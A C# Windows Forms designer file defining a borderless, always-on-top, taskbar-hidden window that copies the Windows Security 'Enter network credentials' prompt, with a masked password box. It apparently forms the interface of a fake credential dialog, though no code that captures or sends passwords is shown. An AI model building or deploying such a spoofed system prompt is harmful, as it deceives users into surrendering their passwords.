namespace TLAD
{
    partial class WindowsSecurity
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.WindowsSecurityLabel = new System.Windows.Forms.Label();
            this.TitleLabel = new System.Windows.Forms.Label();
            this.PasswordBox = new System.Windows.Forms.TextBox();
            this.ConnectingToLabel = new System.Windows.Forms.Label();
            this.UserIdLabel = new System.Windows.Forms.Label();
            this.OkButton = new System.Windows.Forms.Button();
            this.XLabel = new System.Windows.Forms.Label();
            this.SuspendLayout();
            // 
            // WindowsSecurityLabel
            // 
            this.WindowsSecurityLabel.AutoSize = true;
            this.WindowsSecurityLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.WindowsSecurityLabel.Location = new System.Drawing.Point(12, 9);
            this.WindowsSecurityLabel.Name = "WindowsSecurityLabel";
            this.WindowsSecurityLabel.Size = new System.Drawing.Size(119, 17);
            this.WindowsSecurityLabel.TabIndex = 0;
            this.WindowsSecurityLabel.Text = "Windows Security";
            // 
            // TitleLabel
            // 
            this.TitleLabel.AutoSize = true;
            this.TitleLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 14F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.TitleLabel.Location = new System.Drawing.Point(11, 39);
            this.TitleLabel.Name = "TitleLabel";
            this.TitleLabel.Size = new System.Drawing.Size(222, 24);
            this.TitleLabel.TabIndex = 1;
            this.TitleLabel.Text = "Enter network credentials";
            // 
            // PasswordBox
            // 
            this.PasswordBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 14F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.PasswordBox.Location = new System.Drawing.Point(15, 119);
            this.PasswordBox.Margin = new System.Windows.Forms.Padding(5);
            this.PasswordBox.MaximumSize = new System.Drawing.Size(220, 30);
            this.PasswordBox.MaxLength = 64;
            this.PasswordBox.MinimumSize = new System.Drawing.Size(220, 30);
            this.PasswordBox.Name = "PasswordBox";
            this.PasswordBox.Size = new System.Drawing.Size(220, 29);
            this.PasswordBox.TabIndex = 2;
            this.PasswordBox.UseSystemPasswordChar = true;
            this.PasswordBox.WordWrap = false;
            // 
            // ConnectingToLabel
            // 
            this.ConnectingToLabel.AutoSize = true;
            this.ConnectingToLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ConnectingToLabel.Location = new System.Drawing.Point(12, 78);
            this.ConnectingToLabel.Name = "ConnectingToLabel";
            this.ConnectingToLabel.Size = new System.Drawing.Size(99, 17);
            this.ConnectingToLabel.TabIndex = 3;
            this.ConnectingToLabel.Text = "Connecting to ";
            // 
            // UserIdLabel
            // 
            this.UserIdLabel.AutoSize = true;
            this.UserIdLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.UserIdLabel.Location = new System.Drawing.Point(12, 109);
            this.UserIdLabel.Name = "UserIdLabel";
            this.UserIdLabel.Size = new System.Drawing.Size(0, 17);
            this.UserIdLabel.TabIndex = 4;
            // 
            // OkButton
            // 
            this.OkButton.DialogResult = System.Windows.Forms.DialogResult.Cancel;
            this.OkButton.Location = new System.Drawing.Point(255, 119);
            this.OkButton.Name = "OkButton";
            this.OkButton.Size = new System.Drawing.Size(120, 30);
            this.OkButton.TabIndex = 5;
            this.OkButton.Text = "OK";
            this.OkButton.UseVisualStyleBackColor = true;
            this.OkButton.Click += new System.EventHandler(this.OkButton_Click);
            // 
            // XLabel
            // 
            this.XLabel.AutoSize = true;
            this.XLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.XLabel.Location = new System.Drawing.Point(356, 5);
            this.XLabel.Name = "XLabel";
            this.XLabel.Size = new System.Drawing.Size(26, 25);
            this.XLabel.TabIndex = 6;
            this.XLabel.Text = "X";
            this.XLabel.Click += new System.EventHandler(this.label1_Click);
            // 
            // WindowsSecurity
            // 
            this.AcceptButton = this.OkButton;
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.CancelButton = this.OkButton;
            this.ClientSize = new System.Drawing.Size(387, 176);
            this.Controls.Add(this.XLabel);
            this.Controls.Add(this.OkButton);
            this.Controls.Add(this.UserIdLabel);
            this.Controls.Add(this.ConnectingToLabel);
            this.Controls.Add(this.PasswordBox);
            this.Controls.Add(this.TitleLabel);
            this.Controls.Add(this.WindowsSecurityLabel);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "WindowsSecurity";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Windows Security";
            this.TopMost = true;
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label WindowsSecurityLabel;
        private System.Windows.Forms.Label TitleLabel;
        private System.Windows.Forms.TextBox PasswordBox;
        private System.Windows.Forms.Label ConnectingToLabel;
        private System.Windows.Forms.Label UserIdLabel;
        private System.Windows.Forms.Button OkButton;
        private System.Windows.Forms.Label XLabel;
    }
}

